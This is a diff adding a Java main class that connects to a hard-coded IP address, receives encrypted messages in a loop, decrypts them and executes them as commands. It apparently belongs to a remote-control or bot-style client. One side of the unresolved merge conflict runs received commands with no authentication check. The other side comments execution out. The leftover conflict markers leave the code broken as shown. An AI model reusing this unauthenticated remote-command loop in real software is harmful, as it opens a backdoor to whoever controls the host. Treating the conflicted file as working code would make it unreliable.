@@ -1,0 +1,47 @@
+package com.owlfloater898.bIpP;
+
+import java.io.IOException;
+import java.net.UnknownHostException;
+
+import org.json.simple.JSONObject;
+
+import com.owlfloater898.bIpP.connections.Commands;
+import com.owlfloater898.bIpP.connections.Messages;
+import com.owlfloater898.bIpP.connections.Sockets;
+
+public class Main {
+
+	public static void main(String[] args) throws UnknownHostException, IOException
+	{
+		Sockets sockets = new Sockets();
+		Commands commands = new Commands();
+		Messages messages = new Messages();
+<<<<<<< HEAD
+		sockets.createSocket("104.236.115.100", 4095);
+=======
+		sockets.createSocket("10.101.44.12", 4095);
+>>>>>>> 57f80f023d42549a0b63a012005bed914562e6bb
+		while (true)
+		{
+			String encryptedMessage = sockets.receiveMessage();
+			String decryptedMessage = null;
+			try 
+			{
+				decryptedMessage = messages.decryptMessage(encryptedMessage);
+			}
+			catch (Exception e) 
+			{
+				e.printStackTrace();
+			}
+<<<<<<< HEAD
+			commands.executeCommand(commands.parseCommand(decryptedMessage));
+=======
+			JSONObject jobj = messages.getJSONObject(decryptedMessage);
+			if (messages.testKey(jobj))
+			{
+				//commands.executeCommand(commands.parseCommand(commands.getCommandToExecute(jobj)));
+			}
+>>>>>>> 57f80f023d42549a0b63a012005bed914562e6bb
+		}
+	}
+}
